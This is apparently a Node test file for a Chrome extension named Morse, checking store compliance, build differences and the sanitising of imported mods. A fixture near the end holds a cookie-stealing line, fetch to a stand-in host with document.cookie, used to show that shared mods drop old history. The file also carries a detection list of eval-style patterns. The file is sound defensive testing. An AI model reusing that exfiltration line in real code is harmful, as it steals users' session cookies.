// Chrome Web Store checks that need no browser (docs/store/README.md):
//   - nothing in the extension runs a string as code; mod code goes only
//     through chrome.userScripts, and without it the engine treats the code
//     as waiting, not as a mistake to repair
//   - the manifest asks for what docs/store/permissions.md explains, loads
//     nothing from elsewhere, and keeps Chrome's default page security rules
//   - the icons are the sizes the store wants, the 128px one with 16px padding
//   - an install keeps only what its review showed: no edit list, and no older
//     versions from a link or a mod file
import "./helpers/home.js";
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync, readdirSync, existsSync } from "node:fs";
import { inflateSync } from "node:zlib";
import path from "node:path";
import { runMorse } from "../core/engine.js";
import { registerProvider } from "../core/providers.js";
import { createMod, encodeShare } from "../core/mod.js";
import { asReviewed } from "../core/summary.js";
import { parseImport, prepareInstall, exportBundle } from "../core/backup.js";
import { compileEdits } from "../core/edits.js";

const root = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
const read = p => readFileSync(path.join(root, p), "utf8");
const DIST = path.join(root, "dist", "extension");
const built = existsSync(path.join(DIST, "manifest.json"));

// Every way to run a string as code in a page or an extension.
const STRING_CODE = [
  [/\beval\s*\(/, "eval("],
  [/\bnew\s+Function\s*\(/, "new Function("],
  [/(^|[^.\w$])Function\s*\(\s*["'`]/, "Function(\"…\")"],
  [/\bset(Timeout|Interval)\s*\(\s*["'`]/, "setTimeout/setInterval with a string"],
  [/world\s*:\s*["']MAIN["']/, "a MAIN world script"],
  [/\bunsafe-eval\b/, "unsafe-eval"],
];
const extensionSources = () => readdirSync(path.join(root, "extension")).filter(f => /\.(js|html)$/.test(f)).map(f => `extension/${f}`);
// Strip comments and regex/string mentions that only talk about these words.
const code = src => src.replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:"'`\\])\/\/.*$/gm, "$1");

test("nothing in the extension runs a string as code", () => {
  for (const f of extensionSources()) {
    const src = code(read(f));
    for (const [re, what] of STRING_CODE) assert.doesNotMatch(src, re, `${f}: ${what}`);
  }
  // chrome.scripting only runs files from the package, or a function written in the package with no code passed in.
  for (const f of extensionSources()) {
    for (const [, call] of code(read(f)).matchAll(/executeScript\(\{([^]*?)\}\)/g)) {
      assert.doesNotMatch(call, /\bargs\s*:/, `${f}: executeScript passes nothing in`);
      assert.match(call, /\bfiles\s*:\s*\["[\w./-]+"\]|\bfunc\s*:\s*\(\)\s*=>/, `${f}: executeScript runs a packaged file or a fixed function`);
    }
  }
  // Mod code reaches a page only through chrome.userScripts, in background.js.
  const users = extensionSources().filter(f => /userScripts\.execute\(/.test(code(read(f))));
  assert.deepEqual(users, ["extension/background.js"]);
});

test("the built extension has no string-to-code either, the bundled model SDK included", { skip: !built && "no dist/extension (npm run build)" }, () => {
  const files = [];
  const walk = d => { for (const e of readdirSync(d, { withFileTypes: true })) e.isDirectory() ? walk(path.join(d, e.name)) : /\.(js|html)$/.test(e.name) && files.push(path.join(d, e.name)); };
  walk(DIST);
  for (const f of files) {
    const src = code(readFileSync(f, "utf8"));
    // runtime.js (the content script) mentions these words inside the regexes and
    // strings that describe a mod's code (core/summary.js); none is a call.
    for (const [re, what] of STRING_CODE.slice(0, 5)) assert.doesNotMatch(src, re, `${path.relative(root, f)}: ${what}`);
  }
});

test("without “Allow User Scripts” the engine keeps the change: the style shows, the code waits, no second try", async () => {
  let asked = 0, ran = 0;
  registerProvider("waits", async (s, m, { onToken }) => { asked++; const r = "TITLE: Word count\n```css\nh1 { color: red }\n```\n```js\nmorse.watch('h1', h => h.title = 'x');\n```"; onToken(r); return r; });
  const css = [];
  const res = await runMorse({
    settings: { provider: "waits" }, request: "count words", context: { url: "x", title: "x" },
    emit: e => { if (e.type === "css") css.push(e.css); },
    exec: async () => { ran++; return { ok: false, waiting: "userScripts", error: "waits for “Allow User Scripts”" }; },
    probe: async () => ({ fp: "same", unmatched: [] }),
  });
  assert.equal(res.ok, true);
  assert.equal(res.waiting, "userScripts");
  assert.equal(res.attempts, 1);
  assert.equal(asked, 1, "the model isn't asked to fix code that never ran");
  assert.equal(ran, 1);
  assert.match(res.css, /color: red/);
  assert.match(res.js, /morse\.watch/, "the code is kept, to run once it's allowed");
  assert.ok(css.length, "the style was shown");
});

test("the manifest asks only for what the store notes explain, and loads nothing from elsewhere", () => {
  const m = JSON.parse(read("extension/manifest.json"));
  const notes = read("docs/store/permissions.md");
  assert.deepEqual(m.permissions.slice().sort(), ["downloads", "scripting", "storage", "tabs", "userScripts"]);
  for (const p of [...m.permissions, ...m.host_permissions]) assert.ok(notes.includes(`\`${p}\``), `docs/store/permissions.md explains ${p}`);
  assert.deepEqual(m.host_permissions, ["<all_urls>"]);
  assert.equal(m.optional_permissions, undefined);
  // Chrome's default rules for extension pages (no eval, no remote scripts), and
  // stricter ones than the default for the sandboxed practice page, which allows eval.
  assert.deepEqual(Object.keys(m.content_security_policy), ["sandbox"]);
  assert.match(m.content_security_policy.sandbox, /(^|;)\s*script-src 'self'\s*(;|$)/);
  assert.doesNotMatch(m.content_security_policy.sandbox, /unsafe-|https?:|\*/);
  assert.equal(m.web_accessible_resources, undefined, "no page can load Morse's files");
  assert.equal(m.externally_connectable, undefined);
  assert.equal(m.manifest_version, 3);
  for (const f of readdirSync(path.join(root, "extension")).filter(f => f.endsWith(".html"))) {
    for (const [, src] of read(`extension/${f}`).matchAll(/<script[^>]*\bsrc="([^"]+)"/g)) assert.doesNotMatch(src, /^(https?:)?\/\//, `${f} loads ${src} from the package`);
    assert.doesNotMatch(read(`extension/${f}`), /<script(?![^>]*\bsrc=)[^>]*>\s*\S/, `${f}: no inline script`);
  }
});

// Width, height and the box the visible pixels sit in, from a PNG the build wrote
// (8-bit RGBA, filter 0 rows: what scripts/build.js writes).
function pngBox(file) {
  const buf = readFileSync(file);
  const w = buf.readUInt32BE(16), h = buf.readUInt32BE(20);
  const idat = [];
  for (let off = 8; off < buf.length;) {
    const len = buf.readUInt32BE(off), type = buf.toString("latin1", off + 4, off + 8);
    if (type === "IDAT") idat.push(buf.subarray(off + 8, off + 8 + len));
    off += 12 + len;
  }
  const raw = inflateSync(Buffer.concat(idat));
  let x0 = w, y0 = h, x1 = -1, y1 = -1;
  for (let y = 0; y < h; y++) {
    assert.equal(raw[y * (w * 4 + 1)], 0, "filter 0 rows");
    for (let x = 0; x < w; x++) if (raw[y * (w * 4 + 1) + 1 + x * 4 + 3]) { x0 = Math.min(x0, x); y0 = Math.min(y0, y); x1 = Math.max(x1, x); y1 = Math.max(y1, y); }
  }
  return { w, h, x0, y0, x1, y1 };
}

test("the listing's summary is the manifest's description: 132 characters at most; Chrome 138+ for “Allow User Scripts”", () => {
  const m = JSON.parse(read("extension/manifest.json"));
  assert.ok(m.description.length <= 132, `${m.description.length} characters`);
  assert.ok(read("docs/store/listing.md").includes(m.description), "docs/store/listing.md has the same summary");
  // userScripts.execute is Chrome 135; the per-extension "Allow User Scripts" switch Morse tells people about is 138.
  assert.ok(Number(m.minimum_chrome_version) >= 138);
});

// MORSE_STORE=1 (npm run store) leaves out the local share page that tests
// use, and the demo sites' local gallery list; the test build keeps them.
// Both builds, side by side in a scratch folder.
test("a store build doesn't trust the test share page or read the demo gallery list; a test build does; nothing else differs", async () => {
  const { execFileSync } = await import("node:child_process");
  const { mkdtempSync, rmSync } = await import("node:fs");
  const os = await import("node:os");
  const { storeChecks } = await import("../scripts/store.js");
  const tmp = mkdtempSync(path.join(os.tmpdir(), "morse-store-build-"));
  try {
    const build = (dir, env) => execFileSync(process.execPath, [path.join(root, "scripts/build.js"), "--out", dir], { env: { ...process.env, MORSE_STORE: "", ...env }, stdio: "ignore" });
    const dev = path.join(tmp, "dev"), store = path.join(tmp, "store");
    build(dev, {});
    build(store, { MORSE_STORE: "1" });
    const host = d => readFileSync(path.join(d, "host.js"), "utf8");
    const pages = d => /const SHARE_PAGES = (\[[^\]]*\])/.exec(host(d).replace(/\/\*[^*]*\*\//g, ""))[1];
    assert.deepEqual(JSON.parse(pages(dev)), ["https://sam-siavoshian.github.io/RRAA/share/", "http://127.0.0.1:8787/share/"]);
    assert.deepEqual(JSON.parse(pages(store)), ["https://sam-siavoshian.github.io/RRAA/share/"]);
    const files = d => { const out = []; const walk = (b, rel = "") => { for (const e of readdirSync(path.join(b, rel), { withFileTypes: true })) e.isDirectory() ? walk(b, path.join(rel, e.name)) : out.push(path.join(rel, e.name)); }; walk(d); return out.sort(); };
    assert.deepEqual(files(store), files(dev));
    for (const f of files(dev)) if (f !== "host.js" && f !== "background.js") assert.ok(readFileSync(path.join(dev, f)).equals(readFileSync(path.join(store, f))), `${f} is the same in both builds`);
    // The service worker: pages on the demo ports (127.0.0.1:8787-8797) get the
    // local gallery list in a test build only; the store build has no such address.
    const sw = d => readFileSync(path.join(d, "background.js"), "utf8");
    const DEMO_LIST = "http://127.0.0.1:8787/site/mods/index.json";
    assert.ok(sw(dev).includes(DEMO_LIST));
    assert.ok(!/127\.0\.0\.1:8787\/site\/mods/.test(sw(store)), "the store build never reads the demo list");
    const only = (a, b) => { const bs = new Set(b.split("\n")); return a.split("\n").filter(l => !bs.has(l)); };
    assert.deepEqual(only(sw(store), sw(dev)), ['  demoIndex: true ? "" : DEMO_INDEX_URL'], "and nothing else differs");
    assert.deepEqual((await storeChecks(store)).problems, []);
    const devProblems = (await storeChecks(dev)).problems.join("\n");
    assert.match(devProblems, /test share page/, "npm run store refuses a test build");
    assert.match(devProblems, /demo sites' gallery list/);
  } finally { rmSync(tmp, { recursive: true, force: true }); }
});

test("icons: 16, 32, 48 and 128px, the 128px one with its artwork in the middle 96px", { skip: !built && "no dist/extension (npm run build)" }, () => {
  const m = JSON.parse(readFileSync(path.join(DIST, "manifest.json"), "utf8"));
  assert.deepEqual(Object.keys(m.icons).map(Number), [16, 32, 48, 128]);
  for (const [size, file] of Object.entries(m.icons)) {
    const b = pngBox(path.join(DIST, file));
    assert.deepEqual([b.w, b.h], [+size, +size], file);
  }
  const big = pngBox(path.join(DIST, m.icons[128]));
  assert.ok(Math.min(big.x0, big.y0) >= 16 && Math.max(big.x1, big.y1) <= 111, `at least 16px of transparent padding on every side (artwork ${big.x0},${big.y0} to ${big.x1},${big.y1})`);
  assert.ok(big.x1 - big.x0 >= 88, "and the artwork fills the 96px in the middle");
  assert.equal(m.version, JSON.parse(read("package.json")).version);
});

// ---- imports keep only what the review showed

// A page tool's mod: its edit list is what Morse rebuilds the code from later.
const quick = () => {
  const edits = [{ op: "page", kind: "zoom", level: 2 }];
  return createMod({ title: "Text size 120%", prompt: "Page tool: Text size", url: "https://example.com/", kind: "quick", edits, ...compileEdits(edits) });
};

test("an imported page-tool or edit-tools mod loses its edit list: it is the reviewed code and nothing else", async () => {
  const m = quick();
  // Someone hands over a file whose edit list says something else than its code.
  const sneaky = { ...m, edits: [{ op: "a11y", kind: "fix", fixes: [{ kind: "name", sel: "button", text: "Pay now" }] }] };
  assert.ok(sneaky.edits.length && sneaky.kind === "quick");
  for (const source of [JSON.stringify(sneaky), await encodeShare(sneaky), JSON.stringify(exportBundle([sneaky]))]) {
    const r = await parseImport(source);
    const shown = r.mods[0];
    assert.equal(shown.edits, undefined, `${r.kind}: the review gets no edit list`);
    assert.equal(shown.kind, undefined, `${r.kind}: and it isn't a page-tool mod any more`);
    assert.equal(shown.css, m.css, `${r.kind}: the code is what it was`);
    const saved = prepareInstall(sneaky, { kind: r.kind, where: { url: "https://example.com/" } });
    assert.equal(saved.edits, undefined, `${r.kind}: nothing to rebuild from after install`);
    assert.equal(saved.kind, undefined);
    assert.equal(saved.css, m.css);
    assert.equal(saved.js, m.js);
  }
  // Other kinds and fields are left alone.
  assert.deepEqual(asReviewed({ id: "a", kind: "answer", css: "", js: "" }), { id: "a", kind: "answer", css: "", js: "" });
});

test("a link or a mod file never brings older versions; a backup keeps its own", () => {
  const m = { ...createMod({ title: "Calm", prompt: "calm", css: "a{}", js: "", url: "https://example.com/" }), history: [{ prompt: "old", css: "", js: "fetch('https://x.example/' + document.cookie)", at: "2026-01-01T00:00:00Z" }] };
  assert.equal(prepareInstall(m, { kind: "link" }).history, undefined);
  assert.equal(prepareInstall(m, { kind: "mod" }).history, undefined);
  assert.equal(prepareInstall(m, { kind: "backup" }).history.length, 1);
});
